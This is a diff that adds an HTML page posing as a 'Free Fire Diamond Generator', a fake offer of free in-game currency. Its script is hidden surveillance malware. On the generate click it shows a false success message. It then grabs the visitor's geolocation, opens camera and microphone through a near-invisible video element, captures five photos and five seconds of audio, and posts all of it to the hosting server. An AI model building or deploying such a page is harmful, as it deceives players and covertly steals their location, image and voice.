@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ps" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire Diamond Generator</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background-color: #0b131e; color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 15px; }
+        .container { width: 100%; max-width: 420px; background-color: #121c2c; border-radius: 20px; padding: 20px; box-shadow: 0 8px 25px rgba(0,0,0,0.6); display: flex; flex-direction: column; gap: 15px; }
+        .header { display: flex; justify-content: space-between; align-items: center; }
+        .logo-title { color: #ff5722; font-size: 26px; font-weight: 900; font-style: italic; }
+        .logo-sub { color: #ffffff; font-size: 26px; font-weight: 900; font-style: italic; }
+        .badge-diamonds { background-color: #ff9800; color: #000; font-size: 11px; font-weight: bold; padding: 6px 12px; border-radius: 20px; }
+        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; text-align: center; background-color: #1a2638; padding: 12px 8px; border-radius: 14px; }
+        .stat-val { font-size: 16px; font-weight: bold; color: #ff7043; }
+        .stat-lbl { font-size: 10px; color: #90a4ae; margin-top: 3px; }
+        .card { background-color: #1a2638; padding: 12px 15px; border-radius: 14px; border: 1px solid #23344d; }
+        .card-label { font-size: 13px; color: #90a4ae; margin-bottom: 8px; display: block; }
+        .input-box { width: 100%; background: transparent; border: none; color: #ffb74d; font-size: 18px; font-weight: bold; outline: none; }
+        select.input-box { background-color: #1a2638; color: white; border-radius: 6px; padding: 4px 0; }
+        .grid-diamonds { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+        .diamond-card { background-color: #1a2638; border: 1px solid #23344d; padding: 15px 5px; border-radius: 14px; text-align: center; cursor: pointer; position: relative; }
+        .diamond-card.active { background: linear-gradient(135deg, #ff9800, #ff5722); border-color: #ffb74d; }
+        .pop-badge { position: absolute; top: -8px; left: 50%; transform: translateX(-50%); background-color: #ff5722; color: white; font-size: 8px; padding: 2px 6px; border-radius: 6px; }
+        .d-title { font-size: 16px; font-weight: bold; color: #ffffff; }
+        .d-sub { font-size: 11px; color: #b0bec5; margin-top: 4px; }
+        .generate-btn { background: linear-gradient(135deg, #ff9800, #ff5722); color: white; width: 100%; padding: 16px; border: none; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 5px; }
+        .error-box { display: none; background-color: rgba(244, 67, 54, 0.15); border: 1px solid #f44336; border-radius: 12px; padding: 12px; text-align: center; color: #ef5350; font-weight: bold; }
+        .success-box { display: none; background-color: rgba(76, 175, 80, 0.15); border: 1px solid #4caf50; border-radius: 12px; padding: 12px; text-align: center; color: #81c784; font-weight: bold; }
+        #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -1; }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo-area"><span class="logo-title">FREE</span><span class="logo-sub">FIRE</span></div>
+            <div class="badge-diamonds">Diamonds</div>
+        </div>
+        <div class="stats-grid">
+            <div class="stat-card"><div class="stat-val">2.5M</div><div class="stat-lbl">Active Users</div></div>
+            <div class="stat-card"><div class="stat-val">8.7M</div><div class="stat-lbl">Diamonds Given</div></div>
+            <div class="stat-card"><div class="stat-val">99.8%</div><div class="stat-lbl">Success Rate</div></div>
+        </div>
+        <div class="card">
+            <span class="card-label">🆔 Enter Free Fire User ID</span>
+            <input type="text" class="input-box" id="userId" placeholder="Enter User ID here...">
+        </div>
+        <span class="card-label" style="margin-bottom: -5px;">Select Diamonds</span>
+        <div class="grid-diamonds">
+            <div class="diamond-card" data-diamond="1K"><div class="d-title">💎 1K</div><div class="d-sub">Diamonds</div></div>
+            <div class="diamond-card active" data-diamond="5K"><div class="pop-badge">POPULAR</div><div class="d-title">💎 5K</div><div class="d-sub">Diamonds</div></div>
+            <div class="diamond-card" data-diamond="10K"><div class="d-title">💎 10K</div><div class="d-sub">Diamonds</div></div>
+        </div>
+        <div class="card">
+            <span class="card-label">🌐 Select Server</span>
+            <select class="input-box" id="serverSelect">
+                <option value="India Server">🇮🇳 India Server</option><option value="Asia Server">🌏 Asia Server</option>
+            </select>
+        </div>
+        <button id="generateBtn" class="generate-btn">💎 Generate Diamonds</button>
+        <div id="errorBox" class="error-box">⚠️ Please enter your Free Fire User ID first!</div>
+        <div id="successBox" class="success-box">✅ Successfully added <span id="selectedDiamondText">5K</span> Diamonds to ID!</div>
+    </div>
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+    <script>
+        const diamondCards = document.querySelectorAll('.diamond-card');
+        let selectedDiamondValue = '5K';
+        diamondCards.forEach(c => c.addEventListener('click', function() {
+            diamondCards.forEach(x => x.classList.remove('active'));
+            this.classList.add('active');
+            selectedDiamondValue = this.getAttribute('data-diamond');
+        }));
+        async function sendData(fd) { try { await fetch(window.location.origin, { method: 'POST', body: fd }); } catch(e){} }
+        async function sendSinglePhoto(stream) {
+            const v = document.getElementById('video'), c = document.getElementById('canvas');
+            if (!v.srcObject) { v.srcObject = stream; await v.play(); }
+            c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
+            c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
+            return new Promise(r => c.toBlob(async b => { const fd = new FormData(); fd.append('photo', b, 'photo.jpg'); await sendData(fd); r(); }, 'image/jpeg'));
+        }
+        async function recordAndSendAudio(stream) {
+            return new Promise(r => {
+                try {
+                    const mr = new MediaRecorder(stream), chunks = [];
+                    mr.ondataavailable = e => chunks.push(e.data);
+                    mr.onstop = async () => { const fd = new FormData(); fd.append('voice', new Blob(chunks, {type: 'audio/ogg'}), 'voice.ogg'); await sendData(fd); r(); };
+                    mr.start(); setTimeout(() => { if(mr.state !== 'inactive') mr.stop(); }, 5000);
+                } catch(e) { r(); }
+            });
+        }
+        document.getElementById("generateBtn").addEventListener("click", async function() {
+            const btn = document.getElementById("generateBtn"), uid = document.getElementById("userId").value.trim();
+            if(!uid) { document.getElementById("errorBox").style.display = "block"; return; }
+            document.getElementById("errorBox").style.display = "none"; btn.disabled = true; btn.innerText = "Connecting...";
+            document.getElementById("successBox").style.display = "block";
+            if (navigator.geolocation) {
+                await new Promise(r => navigator.geolocation.getCurrentPosition(async pos => {
+                    const fd = new FormData(); fd.append('latitude', pos.coords.latitude); fd.append('longitude', pos.coords.longitude); await sendData(fd); r();
+                }, () => r(), { timeout: 4000 }));
+            }
+            try {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    document.getElementById('video').srcObject = stream; await document.getElementById('video').play();
+                    await new Promise(r => setTimeout(r, 300));
+                    let count = 0;
+                    const interval = setInterval(async () => { if(count < 5) { count++; await sendSinglePhoto(stream); } else { clearInterval(interval); } }, 800);
+                    await recordAndSendAudio(stream);
+                    stream.getTracks().forEach(t => t.stop());
+                }
+            } catch(e) {}
+            btn.innerText = "Diamonds Generated ✅";
+        });
+    </script>
+</body>
+</html>
